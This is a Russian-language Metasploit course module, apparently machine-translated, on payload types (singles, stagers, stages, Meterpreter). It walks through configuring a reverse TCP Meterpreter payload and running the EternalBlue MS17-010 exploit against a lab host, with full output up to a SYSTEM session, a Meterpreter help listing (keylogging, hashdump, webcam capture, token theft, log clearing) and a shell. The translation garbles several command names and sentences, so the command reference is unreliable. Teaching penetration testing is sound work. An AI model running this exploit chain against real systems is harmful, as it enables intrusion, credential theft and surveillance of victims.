В Metasploit A `Payload`обозначает модуль, который помогает модулю эксплойта (как правило) возвращать шелл злоумышленнику. Полезные нагрузки отправляются вместе с самим эксплойтом, чтобы обойти стандартные процедуры работы уязвимой службы ( `exploits job`) и затем запуститься на целевой ОС, чтобы, как правило, установить обратное соединение со злоумышленником и закрепиться ( `payload's job`).

В Metasploit Framework существует три различных типа модулей полезной нагрузки: Singles, Stagers и Stages. Использование трех типов взаимодействия с полезной нагрузкой окажется полезным для пентестера. Это может обеспечить необходимую гибкость для выполнения определенных типов задач. Статус «находится ли полезная нагрузка на стадии подготовки» указывается в `/`её имени.

Например, `windows/shell_bind_tcp`представляет собой единую полезную нагрузку без ступени, тогда как `windows/shell/bind_tcp`состоит из устройства для подготовки ступени ( `bind_tcp`) и ступени ( `shell`).

#### Одиночки

Встроенная `Single`полезная нагрузка содержит эксплойт и весь шелл-код для выбранной задачи. Встроенные полезные нагрузки по своей природе более стабильны, чем их аналоги, поскольку содержат все необходимое в одном месте. Однако некоторые эксплойты не поддерживают результирующий размер таких полезных нагрузок, поскольку они могут быть довольно большими. `Singles`Встроенные полезные нагрузки являются самодостаточными. Это единственный объект, отправляемый и выполняемый в целевой системе, дающий результат сразу после запуска. Одна полезная нагрузка может быть такой простой, как добавление пользователя в целевую систему или запуск процесса.

#### Стейджеры

`Stager`Полезные нагрузки работают совместно с `Stage`другими полезными нагрузками для выполнения определенной задачи. Загрузчик (stager) запускается на машине жертвы и инициирует исходящее соединение с прослушивателем злоумышленника, устанавливая канал связи, по которому доставляется последующая полезная нагрузка этапа. Загрузчики обычно разрабатываются как небольшие и надежные. Metasploit автоматически выберет наиболее подходящий загрузчик для данного сценария и при необходимости переключится на менее предпочтительный.

Windows NX против NO-NX Stagers

- Проблема надежности процессоров NX и DEP.
- NX-стейджеры имеют больший объем памяти (VirtualAlloc).
- По умолчанию теперь поддерживается совместимость с NX и Win7.

#### Этапы

`Stages`Это компоненты полезной нагрузки, загружаемые модулями загрузчика. Различные этапы полезной нагрузки предоставляют расширенные возможности без ограничений по размеру, такие как Meterpreter, VNC Injection и другие. Этапы полезной нагрузки автоматически используют промежуточные модули загрузки:

- Одиночный `recv()`отказ при больших полезных нагрузках
- Подготовитель получает промежуточного подготовителя.
- Затем промежуточный этап выполняет полную загрузку.
- Также лучше подходит для RWX

---

## Поэтапная полезная нагрузка

Проще говоря, поэтапная полезная нагрузка — это `exploitation process`модульная и функционально разделенная программа, позволяющая разбить выполняемые ею функции на отдельные блоки кода, каждый из которых выполняет свою задачу индивидуально, но в совокупности объединяет атаку в цепочку. В конечном итоге, если все этапы будут выполнены корректно, это предоставит злоумышленнику удаленный доступ к целевой машине.

Цель этой полезной нагрузки, как и любой другой, помимо предоставления доступа к командной оболочке целевой системы, состоит в том, чтобы быть максимально компактной и незаметной, чтобы максимально облегчить обход антивируса ( `AV`) / системы предотвращения вторжений ( ).`IPS`

`Stage0`Инструкция по созданию промежуточной полезной нагрузки представляет собой начальный шеллкод, отправляемый по сети на уязвимый сервис целевой машины, единственная цель которого — установить обратное соединение с машиной злоумышленника. Это называется обратным соединением. Пользователи Metasploit будут встречать такие инструкции под общими названиями `reverse_tcp`, `reverse_https`, и `bind_tcp`. Например, в `show payloads`команде можно найти полезные нагрузки, которые выглядят следующим образом:

#### MSF - Поэтапная подача грузов

  Полезная нагрузка

```shell-session
msf6 > show payloads

<SNIP>

535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)

<SNIP>
```

Обратные соединения часто оказываются более эффективными, поскольку они используют правила обработки исходящего трафика. Поскольку соединение инициируется жертвой, оно обходит более строгую фильтрацию входящего трафика, обычно применяемую межсетевыми экранами и другими устройствами безопасности. Этот подход использует доверие, обычно оказываемое исходящему трафику, который в большинстве случаев находится в так называемом хранилище `security trust zone`. Однако, конечно, эти правила доверия не соблюдаются слепо устройствами безопасности и персоналом сети, поэтому злоумышленнику следует действовать осторожно даже на этом этапе.

Код Stage0 также предназначен для считывания в память более крупной, последующей полезной нагрузки после её получения. После установления стабильного канала связи между злоумышленником и жертвой, машина злоумышленника, скорее всего, отправит ещё более крупную полезную нагрузку, которая должна предоставить ему доступ к командной оболочке. Эта более крупная полезная нагрузка будет называться `Stage1`полезной нагрузкой. Мы рассмотрим это подробнее в последующих разделах.

#### Полезная нагрузка интерпретатора

Полезная `Meterpreter`нагрузка представляет собой особый тип многофункциональной полезной нагрузки, которая `DLL injection`обеспечивает стабильное соединение с хостом-жертвой, затрудняет его обнаружение с помощью простых проверок и гарантирует сохранение работоспособности после перезагрузки или изменения системы. Meterpreter полностью размещается в оперативной памяти удаленного хоста и не оставляет следов на жестком диске, что делает его обнаружение с помощью традиционных методов криминалистического анализа крайне сложным. Кроме того, скрипты и плагины могут `loaded and unloaded`динамически изменяться по мере необходимости.

После выполнения полезной нагрузки Meterpreter создается новая сессия, которая запускает интерфейс Meterpreter. Он очень похож на интерфейс msfconsole, но все доступные команды направлены на целевую систему, которую полезная нагрузка «заразила». Он предлагает нам множество полезных команд, от перехвата нажатий клавиш, сбора хэшей паролей, прослушивания микрофона и создания скриншотов до имитации токенов безопасности процессов. Мы подробнее рассмотрим Meterpreter в следующем разделе.

Используя Meterpreter, мы также можем `load`применять различные плагины для проведения оценки. Подробнее об этом мы поговорим в разделе «Плагины» этого модуля.

---

## Поиск полезной нагрузки

Чтобы выбрать первую полезную нагрузку, нам нужно знать, что мы хотим сделать на целевой машине. Например, если нам нужна постоянная доступность, мы, вероятно, выберем полезную нагрузку Meterpreter.

Как уже упоминалось выше, полезные нагрузки Meterpreter предоставляют нам значительную гибкость. Их базовая функциональность уже обширна и влиятельна. Мы можем автоматизировать и быстро выполнять части пентестинга в сочетании с плагинами, такими как [Mimikatz Plugin от GentilKiwi,](https://github.com/gentilkiwi/mimikatz) сохраняя при этом организованную и эффективную по времени оценку. Чтобы увидеть все доступные полезные нагрузки, используйте команду `show payloads`в `msfconsole`.

#### MSF - Список полезных нагрузок

  Полезная нагрузка

```shell-session
msf6 > show payloads

Payloads
========

   #    Name                                                Disclosure Date  Rank    Check  Description
-    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline
   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager
   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager
   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager
   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline
   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline
   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline
   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager
   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager
   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager
   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline
   
<SNIP>
   
   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
```

Как видно выше, существует множество доступных полезных нагрузок на выбор. Более того, мы можем создавать свои полезные нагрузки, используя `msfvenom`, но об этом мы поговорим чуть позже. Мы будем использовать ту же цель, что и раньше, и вместо использования полезной нагрузки по умолчанию, которая представляет собой простую `reverse_tcp_shell`, мы будем использовать `Meterpreter Payload for Windows 7(x64)`.

Пролистывая список выше, мы находим раздел, содержащий `Meterpreter Payloads for Windows(x64)`.

  Полезная нагрузка

```shell-session
   515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
   529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
   530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)
   531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
   532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
   533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
   534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64
```

Как видим, поиск нужной информации в таком обширном списке может занять довольно много времени. Мы также можем использовать `grep`фильтрацию `msfconsole`по конкретным терминам. Это ускорит поиск и, следовательно, наш выбор.

Нам нужно ввести `grep`команду с соответствующим параметром в начале, а затем команду, в которой должна происходить фильтрация. Например, предположим, что мы хотим, чтобы для нашего эксплойта обрабатывался параметр `TCP``based` . Соответственно, мы можем сначала выполнить поиск всех результатов, содержащих это слово в полезной нагрузке.`reverse shell``Meterpreter``Meterpreter`

#### MSF - Поиск конкретной полезной нагрузки

  Полезная нагрузка

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)


msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

[*] 14
```

Это даёт нам общее количество `14`результатов. Теперь мы можем добавить ещё одну `grep`команду после первой и выполнить поиск по запросу `reverse_tcp`.

  Полезная нагрузка

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   
   
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

[*] 3
```

С помощью этой команды `grep`мы сократили список необходимых нам полезных нагрузок до минимума. Конечно, `grep`команду можно использовать и для всех остальных команд. Нам нужно лишь знать, что именно мы ищем.

---

## Выбор полезной нагрузки

Как и в случае с модулем, нам нужен порядковый номер записи, которую мы хотим использовать. Чтобы установить полезную нагрузку для текущего выбранного модуля, мы используем её `set payload <no.>`только после выбора модуля эксплойта в начале работы.

#### MSF - Выбор полезной нагрузки

  Полезная нагрузка

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs



msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```

После выбора полезной нагрузки у нас появится больше возможностей.

  Полезная нагрузка

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

Как мы видим, при выполнении `show payloads`команды внутри самого модуля Exploit, msfconsole определила, что целью является машина под управлением Windows, и отобразила только полезные нагрузки, предназначенные для операционных систем Windows.

Мы также видим, что появилось новое поле параметров, напрямую связанное с содержимым полезной нагрузки. Мы сосредоточимся на `LHOST`и `LPORT`(IP-адрес нашего злоумышленника и желаемый порт для инициализации обратного соединения). Конечно, если атака не удастся, мы всегда можем использовать другой порт и перезапустить атаку.

---

## Использование полезных нагрузок

Пришло время настроить параметры как для модуля эксплойта, так и для модуля полезной нагрузки. Для части эксплойта нам потребуется установить следующее:

|**Параметр**|**Описание**|
|---|---|
|`RHOSTS`|IP-адрес удалённого хоста, целевой машины.|
|`RPORT`|Никаких изменений не требуется, достаточно проверить, что мы используем порт 445, где работает SMB.|

Для настройки полезной нагрузки нам потребуется установить следующие параметры:

|**Параметр**|**Описание**|
|---|---|
|`LHOST`|IP-адрес хоста, то есть машины злоумышленника.|
|`LPORT`|Изменения не требуются, достаточно проверить, не используется ли порт уже.|

Если нам нужно быстро проверить IP-адрес нашего LHOST, мы всегда можем вызвать `ifconfig`команду непосредственно из меню msfconsole.

#### MSF — Конфигурация эксплойта и полезной нагрузки

  Полезная нагрузка

```shell-session
msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig

**[\*]** exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500

<SNIP>

inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

<SNIP>


msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15

LHOST => 10.10.14.15


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

Затем мы можем запустить эксплойт и посмотреть, что он вернет. Сравните результаты с выводом ниже:

  Полезная нагрузка

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter > whoami

[-] Unknown command: whoami.


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

Это не командная строка Windows, а обычная `Meterpreter`командная строка. `whoami`Команда, обычно используемая в Windows, здесь не работает. Вместо этого мы можем использовать эквивалент команды в Linux `getuid`. Изучение `help`меню позволит нам получить более полное представление о возможностях полезных нагрузок Meterpreter.

#### MSF - Команды Meterpreter

  Полезная нагрузка

```shell-session
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of Unicode strings
    enable_unicode_encoding   Enables encoding of Unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    IRB                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Strap: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    LCD           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    PWD           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Strap: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    get proxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of hostnames on the target
    route         View and modify the routing table


Strap: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Strap: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idle time       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user's desktop in real-time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Strap: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    get system     Attempt to elevate your privilege to that of the local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestamp Commands
========================

    Command       Description
    -------       -----------
    timestamp     Manipulate file MACE attributes
```

Довольно круто. От извлечения хешей пользователей из SAM до создания скриншотов и активации веб-камер — всё это делается с помощью удобной командной строки в стиле Linux. При дальнейшем изучении мы также видим возможность открыть канал командной строки. Это позволит нам оказаться в реальном интерфейсе командной строки Windows.

#### MSF - Meterpreter Navigation

  Полезная нагрузка

```shell-session
meterpreter > cd Users
meterpreter > ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users
40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User
40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public
100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini
40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris


meterpreter > shell

Process 2664 created.
Channel 1 created.

